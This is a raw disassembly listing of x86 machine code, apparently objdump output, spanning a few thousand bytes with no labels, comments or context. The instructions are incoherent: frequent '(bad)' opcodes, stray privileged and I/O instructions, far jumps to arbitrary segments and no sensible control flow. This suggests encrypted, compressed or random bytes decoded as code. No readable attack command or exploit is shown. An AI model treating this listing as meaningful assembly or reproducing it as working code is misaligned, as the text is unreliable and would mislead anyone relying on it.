  409a42:	les    ecx,FWORD PTR [ebx+0x68896f79]
  409a48:	adc    al,0x9e
  409a4a:	mov    ds:0x1e9646c0,al
  409a4f:	imul   eax,DWORD PTR [eax-0x3712cc33],0xfffffff7
  409a56:	iret   
  409a57:	lahf   
  409a58:	jp     0x409a5d
  409a5a:	repz popf 
  409a5c:	in     al,0x4d
  409a5e:	mov    bh,0xc6
  409a60:	loopne 0x409aae
  409a62:	or     DWORD PTR [esi-0x39cf5bb6],ebx
  409a68:	adc    DWORD PTR [ebx+edx*2+0x43042ba2],ebx
  409a6f:	pop    ds
  409a70:	jmp    0x3d79:0xe8be39d7
  409a77:	lods   al,BYTE PTR ds:[esi]
  409a78:	add    al,0xfa
  409a7a:	mov    bh,0xbf
  409a7c:	cmp    al,BYTE PTR [ebx+0x79]
  409a7f:	test   al,0xc5
  409a81:	add    DWORD PTR [eax+0x66],eax
  409a84:	es cld 
  409a86:	scas   eax,DWORD PTR es:[edi]
  409a87:	or     BYTE PTR [edx],dl
  409a89:	adc    DWORD PTR [ecx],esi
  409a8b:	xor    cl,ah
  409a8d:	pop    ss
  409a8e:	inc    eax
  409a8f:	fcomip st,st(6)
  409a91:	mov    edi,0x15a7a03
  409a96:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409a97:	pop    ebx
  409a98:	test   BYTE PTR [edx],0x3e
  409a9b:	iret   
  409a9c:	add    ebp,DWORD PTR [edi-0x22]
  409a9f:	inc    ebx
  409aa0:	leave  
  409aa1:	cmp    BYTE PTR [ebp+0x53a0def7],cl
  409aa7:	es xchg ebp,eax
  409aa9:	xor    DWORD PTR [ebx],esp
  409aab:	(bad)  
  409aac:	sti    
  409aad:	push   esi
  409aae:	mov    eax,0x283b5d1f
  409ab3:	test   eax,0xd56331ab
  409ab8:	mov    ebx,0xa8724dc4
  409abd:	clc    
  409abe:	jns    0x409a93
  409ac0:	(bad)  [edx-0x63]
  409ac3:	hlt    
  409ac4:	aam    0x2b
  409ac6:	rcl    DWORD PTR [edx+0xb06746a],1
  409acc:	dec    ebx
  409acd:	in     eax,0x35
  409acf:	cmc    
  409ad0:	xlat   BYTE PTR ds:[ebx]
  409ad1:	mov    gs,WORD PTR [ecx+0x60b3975c]
  409ad7:	daa    
  409ad8:	inc    eax
  409ad9:	cli    
  409ada:	push   ss
  409adb:	aam    0x39
  409add:	inc    ebx
  409ade:	or     al,0x9
  409ae0:	jne    0x409ae5
  409ae2:	pop    ebx
  409ae3:	sahf   
  409ae4:	ss push es
  409ae6:	dec    ebx
  409ae7:	(bad)  
  409ae8:	sub    DWORD PTR [ebp+0x5028148],ebp
  409aee:	lahf   
  409aef:	call   0xe292:0xdd590045
  409af6:	adc    BYTE PTR [eax+0x1689ff70],0x4b
  409afd:	mov    esp,gs
  409aff:	push   eax
  409b00:	inc    ecx
  409b01:	scas   al,BYTE PTR es:[edi]
  409b02:	int3   
  409b03:	pop    ebx
  409b04:	or     edx,DWORD PTR [ebp+0x22138743]
  409b0a:	xor    DWORD PTR [esi-0x66],ebp
  409b0d:	pop    ds
  409b0e:	mov    ch,0x95
  409b10:	jmp    0x50e6:0x859176a8
  409b17:	mov    cl,0x43
  409b19:	lahf   
  409b1a:	aad    0x7
  409b1c:	mov    edi,0xde8197e6
  409b21:	(bad)  
  409b22:	mov    ebp,0x1506a580
  409b27:	mov    bh,0x2
  409b29:	mov    ebx,0xbeec5c6e
  409b2e:	dec    eax
  409b2f:	inc    esp
  409b30:	jne    0x409aef
  409b32:	or     BYTE PTR [edi],dl
  409b34:	mov    edi,0xc53c9486
  409b39:	fwait
  409b3a:	jmp    DWORD PTR [eax+0x6cae29d]
  409b40:	xlat   BYTE PTR ds:[ebx]
  409b41:	xchg   edi,eax
  409b42:	cs adc al,0x66
  409b45:	add    al,0x62
  409b47:	and    DWORD PTR ds:0xb5b4735a,ecx
  409b4d:	aam    0x58
  409b4f:	sahf   
  409b50:	sahf   
  409b51:	outs   dx,DWORD PTR ds:[esi]
  409b52:	mov    BYTE PTR [ebx-0x4b],ch
  409b55:	adc    al,0xd1
  409b57:	stc    
  409b58:	ret    
  409b59:	jae    0x409b9f
  409b5b:	in     al,0x36
  409b5d:	and    eax,0x9ac3151b
  409b62:	cmp    eax,edi
  409b64:	mov    eax,ds:0xc5226c65
  409b69:	jns    0x409b96
  409b6b:	mov    ds:0xe680f1d4,al
  409b70:	pop    eax
  409b71:	add    al,0x69
  409b73:	daa    
  409b74:	mov    dl,BYTE PTR fs:[edx+0x7931d8d6]
  409b7b:	js     0x409b31
  409b7d:	pushf  
  409b7e:	test   al,0x91
  409b80:	adc    eax,0x98ee069
  409b85:	push   ebx
  409b86:	dec    ebp
  409b87:	addr16 fsqrt 
  409b8a:	adc    eax,0xc23bdeb4
  409b8f:	(bad)  
  409b91:	xor    BYTE PTR ds:0x59f767bb,bl
  409b97:	outs   dx,BYTE PTR ds:[esi]
  409b98:	ds xchg edi,eax
  409b9a:	push   eax
  409b9b:	mov    ?,WORD PTR [edx+0x62d32e7]
  409ba1:	push   esp
  409ba2:	jmp    0x9badb7c8
  409ba7:	jle    0x409ba2
  409ba9:	cli    
  409baa:	xchg   ecx,eax
  409bab:	push   esp
  409bac:	repz mov bh,0x69
  409baf:	int    0x9e
  409bb1:	outs   dx,DWORD PTR ds:[esi]
  409bb2:	pop    eax
  409bb3:	addr16 jl 0x409b6a
  409bb6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409bb7:	xchg   esp,eax
  409bb8:	and    BYTE PTR [ebx],ch
  409bba:	pop    esp
  409bbb:	stc    
  409bbc:	adc    DWORD PTR [ebp+ebx*1+0x5655d0f5],edi
  409bc3:	lods   eax,DWORD PTR ds:[esi]
  409bc4:	jbe    0x409b70
  409bc6:	fadd   st(6),st
  409bc8:	cmp    dh,dl
  409bca:	mov    bl,0xa3
  409bcc:	push   esp
  409bcd:	adc    ecx,0xfffffffd
  409bd0:	adc    bl,BYTE PTR [edx-0x45ec2b89]
  409bd6:	push   ds
  409bd7:	cmp    DWORD PTR [ecx+esi*1],0xffffffd8
  409bdb:	push   ebx
  409bdc:	sbb    edi,DWORD PTR [eax]
  409bde:	push   0x9698387d
  409be3:	out    0xa8,al
  409be5:	popa   
  409be6:	jns    0x409c00
  409be8:	dec    edi
  409be9:	loopne 0x409bb0
  409beb:	into   
  409bec:	mov    BYTE PTR [edi+0x3aa77e1],bh
  409bf2:	(bad)  
  409bf3:	in     eax,dx
  409bf4:	push   esp
  409bf5:	cmp    BYTE PTR [edi+0x4c],bl
  409bf8:	sti    
  409bf9:	fldenv ds:0x6902389c
  409bff:	or     DWORD PTR [ebx],ebp
  409c01:	xchg   ebp,eax
  409c02:	adc    BYTE PTR [esi],cl
  409c04:	cwde   
  409c05:	pop    edx
  409c06:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409c07:	xor    DWORD PTR [eax-0x86f036a],edi
  409c0d:	jae    0x409c04
  409c0f:	imul   eax,DWORD PTR [ecx-0x24],0x0
  409c13:	inc    ecx
  409c14:	cmp    bh,dl
  409c16:	push   ebp
  409c17:	ret    
  409c18:	stos   BYTE PTR es:[edi],al
  409c19:	fbstp  TBYTE PTR [ecx+0x76]
  409c1c:	inc    eax
  409c1d:	inc    esp
  409c1f:	popw   ds
  409c21:	xor    al,0x2f
  409c23:	mov    ds:0xb60e06f2,eax
  409c28:	jno    0x409c7d
  409c2a:	lds    eax,FWORD PTR [eax-0x76a2d879]
  409c30:	or     al,0x3c
  409c32:	ret    
  409c33:	stc    
  409c34:	sbb    eax,0x4cc3deaa
  409c39:	jmp    0x409c73
  409c3b:	mov    eax,0x9a16ac6d
  409c40:	mov    dh,0x9b
  409c42:	or     BYTE PTR ds:[ecx+0x7d],0x93
  409c47:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409c48:	je     0x409c11
  409c4a:	and    DWORD PTR [ebp-0x6e283ad9],0xab988c68
  409c54:	enter  0x2490,0x82
  409c58:	dec    ebp
  409c59:	jle    0x409cc6
  409c5b:	lahf   
  409c5c:	daa    
  409c5d:	sub    BYTE PTR ds:0x50f7dd80,dl
  409c63:	dec    edi
  409c64:	jno    0x409cac
  409c66:	scas   eax,DWORD PTR es:[edi]
  409c67:	stc    
  409c68:	jecxz  0x409c45
  409c6a:	and    ebp,DWORD PTR [edi-0x80]
  409c6d:	sub    BYTE PTR [eax-0xb261842],0xcd
  409c74:	imul   edi,DWORD PTR [edx],0xce4b2fd8
  409c7a:	dec    esi
  409c7b:	inc    ebp
  409c7c:	pop    ebx
  409c7d:	push   esi
  409c7e:	pop    esp
  409c7f:	inc    ecx
  409c80:	jmp    0x77c9f2f3
  409c85:	comiss xmm4,xmm1
  409c88:	icebp  
  409c89:	lahf   
  409c8a:	retf   
  409c8b:	stos   DWORD PTR es:[edi],eax
  409c8c:	mov    DWORD PTR [esi-0x5b],esi
  409c8f:	loope  0x409c82
  409c91:	cdq    
  409c92:	sbb    edx,DWORD PTR [ecx+edx*4]
  409c95:	(bad)  
  409c96:	hlt    
  409c97:	sub    edx,edi
  409c99:	cld    
  409c9a:	aad    0x72
  409c9c:	stc    
  409c9d:	push   esi
  409c9e:	push   ss
  409c9f:	adc    BYTE PTR [ebx],dl
  409ca1:	sahf   
  409ca2:	mov    dl,BYTE PTR [edx+0x28]
  409ca5:	int    0x6b
  409ca7:	lods   eax,DWORD PTR ds:[esi]
  409ca8:	sub    BYTE PTR [ebx],cl
  409caa:	jecxz  0x409c9b
  409cac:	inc    edx
  409cad:	leave  
  409cae:	nop
  409caf:	lds    eax,FWORD PTR [eax-0x68]
  409cb2:	outs   dx,DWORD PTR ds:[esi]
  409cb3:	xor    DWORD PTR [edx],eax
  409cb5:	xor    al,0x6c
  409cb7:	inc    edi
  409cb8:	fnstcw WORD PTR [ecx-0x1eaa420f]
  409cbe:	mov    ah,0x23
  409cc0:	not    eax
  409cc2:	cwde   
  409cc3:	inc    edi
  409cc4:	push   esp
  409cc5:	xor    al,0xf3
  409cc7:	push   ecx
  409cc8:	inc    ebp
  409cc9:	sbb    esp,ebp
  409ccb:	aad    0xc5
  409ccd:	(bad)  
  409cce:	cmc    
  409ccf:	jp     0x409d35
  409cd1:	fbstp  TBYTE PTR [esi+0x54119971]
  409cd7:	aad    0xb5
  409cd9:	lods   eax,DWORD PTR ds:[esi]
  409cda:	inc    esp
  409cdb:	hlt    
  409cdc:	push   0x74485464
  409ce1:	pop    esp
  409ce2:	fwait
  409ce3:	mov    ebx,0xf0021796
  409ce8:	jmp    0x323b5925
  409ced:	sbb    eax,0xd1b9e7c9
  409cf2:	sbb    ebx,ecx
  409cf4:	loop   0x409c99
  409cf6:	mov    bl,0x39
  409cf8:	shl    BYTE PTR [ecx],1
  409cfa:	cmp    DWORD PTR [eax],edx
  409cfc:	xor    BYTE PTR [edi],bh
  409cfe:	mov    esp,DWORD PTR [edx]
  409d00:	cmp    ch,bl
  409d02:	jb     0x409d71
  409d04:	ds jmp 0xd6d5bc1d
  409d0a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409d0b:	xchg   bh,al
  409d0d:	enter  0x3bf,0x97
  409d11:	popf   
  409d12:	imul   ebx,DWORD PTR [ecx-0x6c572464],0x65
  409d19:	call   0x89bf8d40
  409d1e:	lods   eax,DWORD PTR ds:[esi]
  409d1f:	push   es
  409d20:	xor    eax,0x1fbe8ced
  409d25:	arpl   WORD PTR [esi-0x4c],ax
  409d28:	dec    edi
  409d29:	scas   al,BYTE PTR es:[edi]
  409d2a:	sbb    BYTE PTR ds:0x228c71f,0x0
  409d31:	dec    esp
  409d32:	in     eax,dx
  409d33:	dec    esi
  409d34:	inc    esp
  409d35:	cmp    eax,0x424f5bc7
  409d3a:	mov    eax,DWORD PTR [ecx+0x18]
  409d3d:	dec    ebp
  409d3e:	out    0xf5,al
  409d40:	int3   
  409d41:	mov    ds:0xa9afc534,eax
  409d46:	test   esi,0xcef3c71
  409d4c:	jecxz  0x409d2c
  409d4e:	dec    edx
  409d4f:	xlat   BYTE PTR ds:[ebx]
  409d50:	mov    ?,WORD PTR [edx+0x3a]
  409d53:	jecxz  0x409d18
  409d55:	xchg   ebx,eax
  409d56:	cdq    
  409d57:	lahf   
  409d58:	dec    edi
  409d59:	lock and eax,0x252551d6
  409d5f:	inc    edx
  409d60:	mov    ds:0x1c58e25b,al
  409d65:	popa   
  409d66:	imul   esp,DWORD PTR [ebp+0x45],0xffffffe4
  409d6a:	mov    ch,dl
  409d6c:	xor    bh,BYTE PTR [ebx]
  409d6e:	xchg   ebx,eax
  409d6f:	out    0xb2,al
  409d71:	pop    esi
  409d72:	fstp   TBYTE PTR ds:0x928a2301
  409d78:	xor    eax,0x430b113f
  409d7d:	mov    DWORD PTR [ecx-0x59],ebx
  409d80:	data16 into 
  409d82:	loop   0x409d90
  409d84:	inc    esi
  409d85:	stc    
  409d86:	retf   0x5272
  409d89:	mov    al,0x1d
  409d8b:	cmp    eax,0x75358542
  409d90:	(bad)  
  409d91:	dec    eax
  409d92:	mov    al,0xc3
  409d94:	dec    edi
  409d95:	pop    ss
  409d96:	aaa    
  409d97:	and    edi,DWORD PTR [ebp-0x5f]
  409d9a:	test   al,0x1a
  409d9c:	idiv   BYTE PTR [edi-0x1b00aa64]
  409da2:	pop    esi
  409da3:	cs pop ds
  409da5:	gs repnz pop ecx
  409da8:	mov    BYTE PTR ds:0xb149316a,ch
  409dae:	shr    DWORD PTR ds:0x161827e,0x7b
  409db5:	aaa    
  409db6:	sub    BYTE PTR [ebx+eax*1-0x11],dh
  409dba:	popa   
  409dbb:	sub    eax,0xb62205f4
  409dc0:	mov    ah,0xca
  409dc2:	xlat   BYTE PTR ds:[ebx]
  409dc3:	xchg   edi,eax
  409dc4:	loop   0x409d94
  409dc6:	add    al,0xe8
  409dc8:	and    eax,0xd4b910b9
  409dcd:	xchg   esp,eax
  409dce:	cmp    al,0xf3
  409dd0:	rcr    DWORD PTR [ebx+esi*1],cl
  409dd3:	std    
  409dd4:	std    
  409dd5:	stos   DWORD PTR es:[edi],eax
  409dd6:	jle    0x409e32
  409dd8:	mov    ds:0x139b558a,eax
  409ddd:	mov    cl,0xb5
  409ddf:	mov    al,ds:0x8b900f59
  409de4:	push   ds
  409de5:	(bad)  
  409de6:	sbb    esi,DWORD PTR [ecx+0x75]
  409de9:	dec    esi
  409dea:	xchg   edx,eax
  409deb:	jbe    0x409e2d
  409ded:	pop    ss
  409dee:	outs   dx,BYTE PTR ds:[esi]
  409def:	fidivr DWORD PTR [esi-0x54]
  409df2:	or     al,0x0
  409df4:	lock fdivr DWORD PTR [edx]
  409df7:	popf   
  409df8:	push   ebx
  409df9:	push   0xffffff96
  409dfb:	mov    eax,DWORD PTR [esi+0x33]
  409dfe:	pop    ss
  409dff:	mov    ch,BYTE PTR [ecx+0x44]
  409e02:	pop    eax
  409e03:	cwde   
  409e04:	jg     0x409e3e
  409e06:	test   edi,edx
  409e08:	in     eax,dx
  409e09:	dec    ebx
  409e0a:	jmp    0x2ca7:0xdc04decc
  409e11:	cmp    cl,ch
  409e13:	sbb    al,0xd7
  409e15:	jmp    0xc7ff:0x99c62217
  409e1c:	add    BYTE PTR [ebp+0x1bae38a1],cl
  409e22:	js     0x409e26
  409e24:	add    eax,0x7dcd5a77
  409e29:	imul   edi,DWORD PTR [ebx],0xffffffb8
  409e2c:	cld    
  409e2d:	pop    es
  409e2e:	adc    al,0xea
  409e30:	mov    esi,0x2df2fa5e
  409e35:	sar    DWORD PTR [ebp+0x79],1
  409e38:	pop    es
  409e39:	adc    eax,0xc38f6f19
  409e3e:	sbb    dl,BYTE PTR [ecx]
  409e40:	pop    esi
  409e41:	adc    edx,ecx
  409e43:	fld    TBYTE PTR [ecx-0x3da5b483]
  409e49:	adc    dh,0x1b
  409e4c:	dec    ebp
  409e4d:	icebp  
  409e4e:	push   cs
  409e4f:	lock in al,dx
  409e51:	push   ecx
  409e52:	adc    DWORD PTR [eax+edx*2+0x58cd25d5],eax
  409e59:	add    DWORD PTR [ecx-0x49],esp
  409e5c:	mov    ebp,0x16ee6561
  409e61:	push   ebp
  409e62:	jmp    0xa9d6:0x79e19610
  409e69:	f2xm1  
  409e6b:	jle    0x409e47
  409e6d:	popa   
  409e6e:	and    al,0x8a
  409e70:	mov    DWORD PTR ds:0xdca3221,eax
  409e76:	jmp    0x409e18
  409e78:	adc    DWORD PTR [ebx-0x1bf15649],esi
  409e7e:	stos   DWORD PTR es:[edi],eax
  409e7f:	inc    edi
  409e80:	rcl    DWORD PTR [ebx],0x91
  409e83:	(bad)  
  409e84:	cmp    DWORD PTR [ebp-0x30],edi
  409e87:	adc    DWORD PTR [edx-0x80],0xa75a89a
  409e8e:	mov    bl,0x5e
  409e90:	xor    ah,BYTE PTR [esp+ecx*4-0x2c744af6]
  409e97:	popf   
  409e98:	add    BYTE PTR [edx+edi*1],0x4
  409e9c:	fwait
  409e9d:	retf   
  409e9e:	imul   ebp,DWORD PTR [edx-0x16],0xe0b7ef2c
  409ea5:	(bad)  
  409ea6:	aad    0x73
  409ea8:	test   eax,edx
  409eaa:	test   BYTE PTR [eax-0xa],0x17
  409eae:	pop    ds
  409eaf:	je     0x409ecc
  409eb1:	cwde   
  409eb2:	cmc    
  409eb3:	ret    
  409eb4:	gs dec ebx
  409eb6:	or     BYTE PTR [ebx],0xe7
  409eb9:	ror    dl,cl
  409ebb:	pop    edx
  409ebc:	jnp    0x409e61
  409ebe:	or     eax,0x7d7c7bde
  409ec3:	adc    cl,BYTE PTR [edi-0x11]
  409ec6:	and    BYTE PTR [edx],dl
  409ec8:	sbb    al,BYTE PTR [ecx+0x48]
  409ecb:	js     0x409e53
  409ecd:	jle    0x409f0e
  409ecf:	push   edx
  409ed0:	out    dx,al
  409ed1:	ror    BYTE PTR [edx+edx*4],cl
  409ed4:	and    BYTE PTR ds:0x2b90ca17,bh
  409eda:	out    0x5e,al
  409edc:	repnz adc cl,BYTE PTR [edx]
  409edf:	lahf   
  409ee0:	imul   edi,DWORD PTR [esi],0xb6dcc36c
  409ee6:	add    BYTE PTR [ecx+0x9],ch
  409ee9:	stc    
  409eea:	adc    BYTE PTR [ebx+edi*4-0x7e04054a],al
  409ef1:	sub    eax,0x98c2bb6c
  409ef6:	sub    ecx,esi
  409ef8:	push   edx
  409ef9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409efa:	js     0x409e8b
  409efc:	cld    
  409efd:	hlt    
  409efe:	cld    
  409eff:	fbstp  TBYTE PTR [esi-0x61695d32]
  409f05:	ins    DWORD PTR es:[edi],dx
  409f06:	mov    ebp,0x8da4f02f
  409f0b:	mov    ecx,0x69a1fa7c
  409f10:	inc    ebp
  409f11:	push   ebp
  409f12:	scas   al,BYTE PTR es:[edi]
  409f13:	icebp  
  409f14:	addr16 xchg esp,eax
  409f16:	xor    al,0x78
  409f18:	inc    edi
  409f19:	xchg   ecx,eax
  409f1a:	(bad)  
  409f1b:	std    
  409f1c:	mov    edx,0x6a8151f6
  409f21:	sti    
  409f22:	dec    eax
  409f23:	inc    esi
  409f24:	and    esi,edi
  409f26:	jg     0x409eaf
  409f28:	scas   al,BYTE PTR es:[edi]
  409f29:	sub    eax,0x9005fe8e
  409f2e:	dec    esp
  409f2f:	pop    ebp
  409f30:	hlt    
  409f31:	cdq    
  409f32:	(bad)  
  409f33:	enter  0x37a,0x5e
  409f37:	jb     0x409f74
  409f39:	mov    esp,DWORD PTR [edi-0x5b]
  409f3c:	xchg   esp,eax
  409f3d:	cs (bad) 
  409f3f:	sub    edx,DWORD PTR [esi-0x5]
  409f42:	xor    eax,0xb20b2e7a
  409f47:	je     0x409f26
  409f49:	jns    0x409f42
  409f4b:	ja     0x409f2e
  409f4d:	dec    edx
  409f4e:	sbb    BYTE PTR [edx-0x548d51bd],cl
  409f54:	jmp    0x409f5f
  409f56:	jb     0x409f2f
  409f58:	lea    edx,[eax+0x5efbba0f]
  409f5e:	mov    BYTE PTR [eax],bl
  409f60:	push   edx
  409f61:	jmp    0xf03c8bf5
  409f66:	mov    al,0xff
  409f68:	in     eax,0x9c
  409f6a:	adc    edi,ecx
  409f6c:	xchg   esp,eax
  409f6d:	rcr    bl,cl
  409f6f:	or     BYTE PTR [ebx-0x39dfba62],ah
  409f75:	sbb    eax,0xf4ee3182
  409f7a:	popf   
  409f7b:	push   esi
  409f7c:	and    esi,DWORD PTR [edi-0x1bd42948]
  409f82:	xchg   ebx,eax
  409f83:	(bad)  
  409f84:	test   BYTE PTR [edx+ebx*8],bl
  409f87:	and    DWORD PTR [eax],ebp
  409f89:	xor    eax,0x642f4054
  409f8e:	adc    dl,BYTE PTR [edi]
  409f90:	jg     0x409fe5
  409f92:	mov    edx,0x787a792b
  409f97:	pop    es
  409f98:	mov    ecx,0xb2cd0e19
  409f9d:	data16 mov ch,0x96
  409fa0:	jmp    0xd75:0xbd3e6c8e
  409fa7:	(bad)  
  409fa8:	mov    eax,ds:0x5571d53c
  409fad:	bound  eax,QWORD PTR [esi+0x309e446e]
  409fb3:	bound  ecx,QWORD PTR [ebx+0x73641838]
  409fb9:	inc    ecx
  409fba:	dec    esi
  409fbb:	cmp    eax,0xe5c23dc8
  409fc0:	adc    bl,BYTE PTR [eax+ebp*4-0xf]
  409fc4:	cmp    eax,0x86d40777
  409fc9:	pop    edx
  409fca:	pusha  
  409fcb:	fistp  WORD PTR [esp+edx*4-0x13]
  409fcf:	mov    cl,cl
  409fd1:	jo     0x409f68
  409fd3:	jge    0x409f6f
  409fd5:	outs   dx,DWORD PTR ds:[esi]
  409fd6:	inc    ebx
  409fd7:	cmc    
  409fd8:	loopne 0x40a008
  409fda:	cmp    eax,0xe22f8cf2
  409fdf:	dec    edi
  409fe0:	lds    esi,FWORD PTR [edx]
  409fe2:	xchg   esi,eax
  409fe3:	mov    bh,0x1
  409fe5:	stos   BYTE PTR es:[edi],al
  409fe6:	push   ds
  409fe7:	ss xor al,0x9e
  409fea:	push   ds
  409feb:	iret   
  409fec:	adc    cl,BYTE PTR [ecx+0x32763774]
  409ff2:	adc    al,0x58
  409ff4:	and    BYTE PTR [ebp-0x6b03dc36],0xd6
  409ffb:	pop    ecx
  409ffc:	and    esi,esp
  409ffe:	xchg   esi,eax
  409fff:	jl     0x409f9d
  40a001:	push   eax
  40a002:	xchg   edx,eax
  40a003:	add    DWORD PTR [esp+esi*8],edi
  40a006:	mov    ah,0x69
  40a008:	sbb    al,0x22
  40a00a:	in     eax,0x7a
  40a00c:	sub    esp,DWORD PTR [esi]
  40a00e:	sbb    al,0xaa
  40a010:	(bad)  [ecx+0x32]
  40a013:	add    BYTE PTR [edx-0x58],ch
  40a016:	push   ebx
  40a017:	add    DWORD PTR [ecx-0x4a],ebp
  40a01a:	sbb    DWORD PTR [ecx-0x672d6da],edx
  40a020:	cwde   
  40a021:	fimul  WORD PTR ds:0xdc711f90
  40a027:	out    0x25,al
  40a029:	xchg   ebx,eax
  40a02a:	xchg   ebp,eax
  40a02b:	or     di,WORD PTR [edx-0x7c7a8149]
  40a032:	fwait
  40a033:	pushf  
  40a034:	mov    dl,0x1
  40a036:	and    eax,0xd331eafc
  40a03b:	adc    esp,edi
  40a03d:	and    eax,0xa6d8f488
  40a042:	cmp    DWORD PTR [ecx],edi
  40a044:	nop
  40a045:	push   esi
  40a046:	or     bl,BYTE PTR [ecx]
  40a048:	jp     0x40a08d
  40a04a:	push   ecx
  40a04b:	jmp    0x276b:0xe0ecc64a
  40a052:	jno    0x40a052
  40a054:	push   eax
  40a055:	test   DWORD PTR [ecx],0x5ed4deb1
  40a05b:	ret    0xb6bf
  40a05e:	sub    cl,BYTE PTR [ebp-0x1ffc311b]
  40a064:	jae    0x40a033
  40a066:	sub    DWORD PTR [ebp+ebx*1-0x74],eax
  40a06a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a06b:	inc    esi
  40a06c:	fdivr  QWORD PTR ds:[ebx-0x42ad40bc]
  40a073:	sub    dh,0x8e
  40a076:	pop    edi
  40a077:	hlt    
  40a078:	adc    eax,esp
  40a07a:	cmc    
  40a07b:	cmp    al,BYTE PTR [ebp*4+0x61281e17]
  40a082:	push   ebx
  40a083:	add    edi,DWORD PTR [ebp+eiz*8+0x1f]
  40a087:	dec    edx
  40a088:	add    DWORD PTR ss:[ebp-0x75],ebp
  40a08c:	mov    edx,0x8501bc40
  40a091:	push   edi
  40a092:	sbb    eax,DWORD PTR [edx]
  40a094:	adc    edx,edx
  40a096:	and    al,0xe7
  40a098:	and    ch,bl
  40a09a:	jo     0x40a025
  40a09c:	scas   al,BYTE PTR es:[edi]
  40a09d:	ds repnz aaa 
  40a0a0:	jmp    0xadd2074f
  40a0a5:	jne    0x40a10f
  40a0a7:	(bad)  
  40a0a8:	fistp  QWORD PTR [ebx]
  40a0aa:	test   al,al
  40a0ac:	sbb    DWORD PTR [esi+ebp*2],0xe4672ead
  40a0b3:	retf   
  40a0b4:	inc    edi
  40a0b5:	repz test BYTE PTR [eax+0x503e7791],dl
  40a0bc:	sub    eax,0xe03eb5da
  40a0c1:	lods   eax,DWORD PTR ds:[esi]
  40a0c2:	sahf   
  40a0c3:	stos   BYTE PTR es:[edi],al
  40a0c4:	cld    
  40a0c5:	int3   
  40a0c6:	stc    
  40a0c7:	lock sub eax,0x88103362
  40a0cd:	and    eax,0x11a637d3
  40a0d2:	and    dh,BYTE PTR [esi-0x27]
  40a0d5:	pop    ecx
  40a0d6:	xchg   DWORD PTR [eax+0xeb643db],edx
  40a0dc:	jnp    0x40a083
  40a0de:	aad    0xb1
  40a0e0:	add    ecx,DWORD PTR [ecx+esi*2+0x2d]
  40a0e4:	add    eax,0x13b8411f
  40a0e9:	fimul  DWORD PTR [ecx]
  40a0eb:	xchg   BYTE PTR [ebp+ebx*4-0x69],ch
  40a0ef:	pop    ss
  40a0f0:	(bad)  
  40a0f1:	mov    al,0xcb
  40a0f3:	push   edi
  40a0f4:	inc    ebp
  40a0f5:	je     0x40a098
  40a0f7:	cld    
  40a0f8:	cmp    dl,al
  40a0fa:	dec    ebp
  40a0fb:	pop    esp
  40a0fc:	jno    0x40a085
  40a0fe:	push   ebp
  40a0ff:	pop    ebp
  40a100:	push   ss
  40a101:	xor    edx,DWORD PTR [ebx+0x1b]
  40a104:	add    dl,BYTE PTR [ebp-0x7a]
  40a107:	test   DWORD PTR [ecx+0x64],edx
  40a10a:	inc    esi
  40a10b:	and    BYTE PTR [eax],bh
  40a10d:	popf   
  40a10e:	jno    0x40a0d0
  40a110:	push   ss
  40a111:	xchg   esp,eax
  40a112:	mov    esp,0xe2f7c96a
  40a117:	adc    eax,0xc72609fb
  40a11c:	sbb    BYTE PTR [esp+ebp*2],ah
  40a11f:	and    DWORD PTR [esp+eax*4],edi
  40a122:	inc    edx
  40a123:	xor    BYTE PTR [esi-0x46],cl
  40a126:	pop    es
  40a127:	mov    esp,0x8b73bfc5
  40a12c:	dec    eax
  40a12d:	aas    
  40a12e:	jnp    0x40a19c
  40a130:	test   eax,0x4a8b46fc
  40a135:	bound  edx,QWORD PTR [ebx-0x1]
  40a138:	(bad)  
  40a13a:	(bad)  
  40a13b:	xor    dl,BYTE PTR [edi]
  40a13d:	leave  
  40a13e:	cmp    eax,0x53578c94
  40a143:	rcr    cl,1
  40a145:	mov    es,WORD PTR [ebx+ebp*4+0x21]
  40a149:	dec    esi
  40a14a:	xor    BYTE PTR [ecx-0x5c],0x2b
  40a14e:	jle    0x40a1ca
  40a150:	push   edi
  40a151:	into   
  40a152:	jecxz  0x40a165
  40a154:	ret    0x2706
  40a157:	aas    
  40a158:	mov    eax,ds:0x8a8e614a
  40a15d:	hlt    
  40a15e:	fisub  WORD PTR [ecx-0x79]
  40a161:	(bad)  
  40a162:	cli    
  40a163:	jns    0x40a1aa
  40a165:	mov    edx,edx
  40a167:	ret    0x8b1e
  40a16a:	xchg   ebp,eax
  40a16b:	popa   
  40a16c:	push   ecx
  40a16d:	cwde   
  40a16e:	ins    DWORD PTR es:[edi],dx
  40a16f:	push   es
  40a170:	sbb    ch,cl
  40a172:	cmp    cl,dh
  40a174:	repz ds cli 
  40a177:	mov    eax,0xf0ea63d7
  40a17c:	sbb    esi,ecx
  40a17e:	mov    ebp,0x2c4524f1
  40a183:	pusha  
  40a184:	fs mov dh,0x22
  40a187:	in     al,0xe4
  40a189:	lods   eax,DWORD PTR ds:[esi]
  40a18a:	xchg   edi,eax
  40a18b:	fwait
  40a18c:	xor    ecx,DWORD PTR [eax]
  40a18e:	test   esp,edx
  40a190:	prefetcht0 BYTE PTR [ecx-0x3a]
  40a194:	clc    
  40a195:	jbe    0x40a201
  40a197:	(bad)  
  40a198:	jno    0x40a192
  40a19a:	imul   eax,DWORD PTR [ecx+0x28c1ec76],0xffffffd9
  40a1a1:	adc    eax,0xdb38a72b
  40a1a6:	mov    eax,DWORD PTR [edi]
  40a1a8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a1a9:	ins    BYTE PTR es:[edi],dx
  40a1aa:	adc    al,0x85
  40a1ac:	push   ebx
  40a1ad:	enter  0x16f6,0x1d
  40a1b1:	cmp    DWORD PTR [edi+edi*2-0x22],edi
  40a1b5:	pop    ecx
  40a1b6:	inc    edx
  40a1b7:	in     eax,0xdd
  40a1b9:	(bad)
  40a1bc:	shr    BYTE PTR gs:[esi+edx*4-0x77],0xbb
  40a1c2:	jmp    0x40a1ef
  40a1c4:	loopne 0x40a1af
  40a1c6:	loop   0x40a207
  40a1c8:	loope  0x40a16f
  40a1ca:	inc    edx
  40a1cb:	inc    ebp
  40a1cc:	inc    esi
  40a1cd:	(bad)  [ebx+eiz*8-0x76bf435c]
